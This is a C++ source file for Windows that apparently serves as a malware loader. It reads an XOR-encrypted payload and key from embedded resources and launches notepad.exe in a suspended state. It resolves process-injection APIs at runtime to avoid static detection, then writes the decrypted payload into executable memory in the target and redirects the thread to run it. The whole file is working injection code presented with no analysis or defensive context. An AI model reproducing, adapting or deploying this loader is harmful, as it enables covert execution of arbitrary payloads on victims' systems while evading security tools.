
#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void its_load_re(const char* renamer, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    
    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
    HGLOBAL resrdata = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(resrdata);
}

int main() {
    
    char* ke;
    DWORD keLen;
    its_load_re("dhanushkey1", &ke, &keLen);
    const char* processptaah = "C:\\Windows\\System32\\notepad.exe";
    char* code199k;
    DWORD code199kLen;
    its_load_re("dhanushcode56", &code199k, &code199kLen);

    STARTUPINFO li = {0};
    
  HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");

    BOOL (*itscreatetPro)(
        LPCSTR lpApplicationName,
        LPSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCSTR lpCurrentDirectory,
        LPSTARTUPINFOA lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    ) = (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        GetProcAddress(istfromKernel32, "CreateProcessA");

  LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(istfromKernel32, "VirtualAllocEx");
    

   BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
    (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(istfromKernel32, "WriteProcessMemory");
     
    PROCESS_INFORMATION pi = {0};
    li.cb = sizeof(li);
    
    
    itscreatetPro(processptaah, 0, 0, 0, FALSE,CREATE_SUSPENDED, 0, 0, &li, &pi);
    GetTickCount();
    
    CONTEXT ctx = {0};
  
    ctx.ContextFlags = CONTEXT_FULL;
    
    GetThreadContext(pi.hThread, &ctx);

    LPVOID gallio = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    for (DWORD i = 0; i < code199kLen; i++) {
        code199k[i] ^= ke[i % keLen];
    }
    pWriteProcessM(pi.hProcess, gallio, code199k, code199kLen, NULL);
    ctx.Rcx = (DWORD64)gallio; 
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread); 

    return 0;
}
